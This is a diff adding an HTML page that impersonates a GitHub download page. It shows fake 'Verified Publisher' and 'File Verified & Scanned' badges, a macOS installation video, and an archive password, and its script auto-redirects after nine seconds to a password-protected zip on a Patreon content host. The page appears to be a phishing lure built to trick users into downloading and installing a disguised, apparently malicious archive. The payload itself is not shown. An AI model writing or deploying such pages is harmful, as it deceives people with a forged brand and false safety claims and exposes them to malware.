@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <title>Preparing your download... · GitHub</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <style>
+      :root { color-scheme: light dark; }
+      * { box-sizing: border-box; }
+      body {
+        margin: 0;
+        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
+        background-color: #0d1117;
+        color: #c9d1d9;
+      }
+      a { color: #58a6ff; text-decoration: none; }
+      a:hover { text-decoration: underline; }
+
+      .application-main { min-height: 100vh; display: flex; flex-direction: column; }
+      header { background-color: #010409; border-bottom: 1px solid #21262d; }
+      .Header { max-width: 1012px; margin: 0 auto; padding: 8px 16px; display:flex; align-items:center; justify-content:space-between; }
+      .Header-item { display:flex; align-items:center; }
+      .Header-logo { display:inline-flex; align-items:center; color:#f0f6fc; }
+      .Header-link { color:#f0f6fc; text-decoration:none; font-weight:600; margin-right:16px; font-size:14px; }
+
+      main { flex:1 0 auto; display:flex; align-items:center; justify-content:center; padding:24px 16px 40px; }
+      .container-xl { width:100%; max-width:840px; margin:0 auto; }
+      .Box { background-color:#0d1117; border:1px solid #30363d; border-radius:6px; box-shadow:0 0 0 1px rgba(27,31,36,0.15); }
+      .Box-header { padding:16px; border-bottom:1px solid #21262d; text-align:center; }
+      .Box-title { font-size:16px; font-weight:600; }
+      .Box-subtitle { font-size:12px; color:#8b949e; margin-top:4px; }
+      .Box-body { padding:24px; }
+      .h2 { font-size:20px; text-align:center; margin:0 0 8px 0; }
+      .text-small { font-size:12px; }
+      .text-muted { color:#8b949e; }
+      .mt-1 { margin-top:4px; } .mt-2 { margin-top:8px; } .mt-3 { margin-top:16px; } .mt-4 { margin-top:24px; }
+      .d-flex { display:flex; } .flex-justify-center { justify-content:center; }
+      .btn { display:inline-block; padding:5px 16px; font-size:14px; font-weight:500; line-height:20px; cursor:pointer; border-radius:6px; border:1px solid rgba(240,246,252,0.1); background:#21262d; color:#f0f6fc; text-decoration:none; }
+      .btn-primary { background-color:#238636; color:#fff; padding:10px 32px; font-size:16px; }
+      .Progress { position:relative; display:block; width:100%; overflow:hidden; background-color:#161b22; border-radius:6px; height:8px; }
+      .Progress-item { background-color:#2ea043; width:0%; height:100%; transition: width 0.2s linear; }
+
+      .note { padding:12px; border-radius:6px; background-color:#161b22; border:1px solid #30363d; font-size:13px; color:#c9d1d9; text-align:center; }
+      .redirect-message { margin-top:16px; font-size:14px; color:#c9d1d9; text-align:center; }
+
+      .verification-box { background: linear-gradient(135deg, #1a472a 0%, #0d2818 100%); border:1px solid #2ea043; border-radius:6px; padding:20px; margin-top:16px; }
+      .verification-title { display:flex; align-items:center; justify-content:center; font-size:16px; font-weight:600; color:#3fb950; margin-bottom:16px; }
+
+      /* Video wrapper constrained to avoid oversized scaling */
+      .video-wrapper {
+        margin-top: 18px;
+        border-radius: 8px;
+        overflow: hidden;
+        border: 1px solid #30363d;
+        background-color: #000;
+        max-width: 720px;
+        margin-left: auto;
+        margin-right: auto;
+      }
+      .video-responsive { position:relative; padding-bottom:56.25%; height:0; overflow:hidden; }
+      .video-responsive iframe, .video-responsive video { position:absolute; top:0; left:0; width:100%; height:100%; border:0; }
+
+      .password-box { margin-top:20px; text-align:center; background-color:rgba(45,55,60,0.12); border:1px solid rgba(70,130,80,0.12); padding:14px 18px; border-radius:8px; display:flex; align-items:center; justify-content:center; gap:12px; }
+      .password-label { font-size:14px; color:#9dbca3; font-weight:600; }
+      .password-code { font-size:18px; font-weight:700; color:#e6ffed; background:linear-gradient(90deg, rgba(62,180,98,0.12), rgba(46,160,67,0.06)); padding:6px 12px; border-radius:6px; border:1px solid rgba(46,160,67,0.16); letter-spacing:1px; }
+
+      footer { border-top:1px solid #21262d; background-color:#010409; color:#8b949e; padding:24px 16px; }
+      .footer-container { max-width:1012px; margin:0 auto; display:flex; align-items:center; justify-content:space-between; flex-wrap:wrap; gap:8px; }
+      .footer-links a { color:#8b949e; text-decoration:none; margin-right:12px; font-size:12px; }
+    </style>
+  </head>
+
+  <body>
+    <div class="application-main">
+      <header>
+        <div class="Header">
+          <div class="Header-item">
+            <a class="Header-logo" href="/">
+              <svg height="32" viewBox="0 0 16 16" width="32" aria-hidden="true">
+                <path fill-rule="evenodd" d="M8 0.198a8 8 0 0 0-2.528 15.597c0.4 0.074 0.547-0.174 0.547-0.386 0-0.19-0.007-0.693-0.011-1.36-2.226 0.483-2.695-1.073-2.695-1.073-0.364-0.924-0.89-1.17-0.89-1.17-0.727-0.497 0.055-0.487 0.055-0.487 0.804 0.057 1.227 0.826 1.227 0.826 0.714 1.223 1.873 0.87 2.33 0.665 0.072-0.517 0.279-0.87 0.508-1.07-1.777-0.202-3.644-0.888-3.644-3.954 0-0.873 0.312-1.587 0.824-2.147-0.083-0.202-0.357-1.017 0.078-2.12 0 0 0.671-0.215 2.2 0.82a7.673 7.673 0 0 1 2.004-0.27c0.68 0.003 1.366 0.092 2.004 0.27 1.528-1.035 2.198-0.82 2.198-0.82 0.437 1.103 0.163 1.918 0.08 2.12 0.513 0.56 0.823 1.274 0.823 2.147 0 3.074-1.87 3.75-3.652 3.948 0.287 0.247 0.543 0.735 0.543 1.482 0 1.07-0.01 1.933-0.01 2.196 0 0.214 0.145 0.463 0.55 0.384A8.001 8.001 0 0 0 8 0.198z"></path>
+              </svg>
+            </a>
+          </div>
+          <div class="Header-item">
+            <a class="Header-link" href="/features">Features</a>
+            <a class="Header-link" href="/security">Security</a>
+            <a class="Header-link" href="/enterprise">Enterprise</a>
+            <a class="Header-link" href="/explore">Explore</a>
+          </div>
+        </div>
+      </header>
+
+      <main>
+        <div class="container-xl">
+          <div class="Box">
+            <div class="Box-header">
+              <div class="Box-title">github.com/downloader</div>
+              <div class="Box-subtitle">Verified Publisher</div>
+            </div>
+
+            <div class="Box-body">
+              <h2 class="h2">Preparing your download...</h2>
+              <p class="text-muted mt-2 text-center">Archives are generated on demand and may take a few seconds.</p>
+
+              <div class="verification-box">
+                <div class="verification-title">
+                  <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z" fill="#3fb950"/>
+                    <circle cx="12" cy="12" r="10" stroke="#3fb950" stroke-width="2" fill="none"/>
+                  </svg>
+                  File Verified &amp; Scanned
+                </div>
+              </div>
+
+              <!-- Video: provided asset link, constrained size so it displays normally -->
+              <div class="video-wrapper" aria-label="Video instruction for macOS installation">
+                <div style="padding:12px 16px; color:#c9d1d9; font-weight:600; background:#081018;">
+                  macOS installation video
+                </div>
+                <div class="video-responsive">
+                  <iframe title="vimeo-player" src="https://player.vimeo.com/video/1155065015?h=caae4c90c8" width="640" height="360" frameborder="0" referrerpolicy="strict-origin-when-cross-origin" allow="autoplay; fullscreen; picture-in-picture; clipboard-write; encrypted-media; web-share"   allowfullscreen></iframe>
+                </div>
+              </div>
+
+              <!-- Password display -->
+              <div class="password-box" role="note" aria-label="Archive password">
+                <div class="password-label">Archive password:</div>
+                <div class="password-code" id="archive-password">2026</div>
+              </div>
+
+              <div class="progress-section mt-3">
+                <div class="text-small text-muted">Estimated time remaining</div>
+                <div class="eta-display" id="eta-label">9s</div>
+                <div class="mt-2 Progress" aria-hidden="true">
+                  <div class="Progress-item" id="progress-bar"></div>
+                </div>
+              </div>
+
+              <div class="redirect-message mt-4" id="redirect-message">
+                You will be automatically redirected in <span id="redirect-seconds">9</span> seconds.
+              </div>
+
+              <div class="mt-3 d-flex flex-justify-center">
+                <button id="redirect-now" class="btn btn-primary">Download now</button>
+              </div>
+
+              <div class="note mt-4">Having trouble? Try downloading again or use a different browser.<br>Please keep this page open while we prepare your archive.</div>
+            </div>
+          </div>
+        </div>
+      </main>
+
+      <footer>
+        <div class="footer-container">
+          <span>© 2026 GitHub, Inc.</span>
+          <div class="footer-links">
+            <a href="/terms">Terms</a>
+            <a href="/privacy">Privacy</a>
+            <a href="/security">Security</a>
+            <a href="/status">Status</a>
+            <a href="/docs">Docs</a>
+          </div>
+        </div>
+      </footer>
+    </div>
+
+    <script>
+      const REDIRECT_URL = "https://c10.patreonusercontent.com/4/patreon-media/p/post/147963484/afe59dccf18b44ab92013bb2a6bafba1/eyJhIjoxLCJwIjoxfQ%3D%3D/1.zip?token-hash=wepHBe8Qtro6O3DcfmzXOdvSSljgpYQp0zLok4vPPfs%3D&token-time=1768694400";
+      const REDIRECT_DELAY_MS = 9000;
+      const totalSeconds = REDIRECT_DELAY_MS / 1000;
+      let remaining = totalSeconds;
+
+      const secondsSpan = document.getElementById("redirect-seconds");
+      const etaLabel = document.getElementById("eta-label");
+      const progressBar = document.getElementById("progress-bar");
+      const redirectNowBtn = document.getElementById("redirect-now");
+
+      function updateCountdown() {
+        if (remaining < 0) remaining = 0;
+        secondsSpan.textContent = remaining.toString();
+        etaLabel.textContent = remaining + "s";
+        const progress = ((totalSeconds - remaining) / totalSeconds) * 100;
+        progressBar.style.width = Math.max(5, progress) + "%";
+      }
+
+      updateCountdown();
+      const intervalId = setInterval(function () {
+        remaining -= 1;
+        updateCountdown();
+        if (remaining <= 0) clearInterval(intervalId);
+      }, 1000);
+
+      const timeoutId = setTimeout(function () {
+        window.location.href = REDIRECT_URL;
+      }, REDIRECT_DELAY_MS);
+
+      redirectNowBtn.addEventListener("click", function () {
+        clearTimeout(timeoutId);
+        window.location.href = REDIRECT_URL;
+      });
+    </script>
+  </body>
+</html>
